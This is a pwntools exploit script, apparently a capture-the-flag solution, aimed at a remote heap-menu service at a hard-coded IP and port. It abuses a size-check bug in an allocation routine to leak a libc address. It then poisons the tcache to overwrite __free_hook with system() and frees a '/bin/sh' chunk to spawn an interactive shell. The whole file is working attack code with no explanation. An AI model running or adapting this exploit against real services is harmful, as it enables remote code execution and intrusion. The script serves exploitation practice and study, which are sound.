import os
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch='amd64'


io=remote('123.57.209.176',30774)
libc=ELF('./libc-2.31.so')

def add(size,data):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.send(data)

def vuladd(size1,size2,data):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('Size: ')
    io.sendline(str(size1))
    io.recvuntil('Size: ')
    io.sendline(str(size2))
    io.recvuntil('Content: ')
    io.send(data)


def free(idx):
    io.recvuntil('>> ')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('Index: ')
    io.sendline(str(idx))


[add(0x80,'a'*0x80) for i in range(8)]#0~7
[free(i) for i in range(6)]
free(7)
free(6)
vuladd(-1,8,'a'*8)#0
show(0)
io.recvuntil('aaaaaaaa')
libc_base=(u64(io.recv(6).ljust(8,b'\x00')))-0x1ebc60
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
print(hex(libc_base))
add(0x60,'b'*0x60)#1
free(0)
add(0x60,'c'*0x60)#0
add(0x60,'x'*0x60)#2
add(0x60,p64(free_hook)+b'\n')#3
add(0x20,'d'*0x20)#4
add(0x20,'e'*0x20)#5
add(0x20,'y'*0x20)#6
add(0x20,'y'*0x20)#7
free(7)
free(4)
free(5)
free(6)
vuladd(-47,0x20,'a'*0x20)#4
add(0x20,'a'*0x20)#5
add(0x20,'/bin/sh\x00\n')#6
add(0x20,p64(sys)+b'\n')
free(6)

#gdb.attach(io)
io.interactive()		


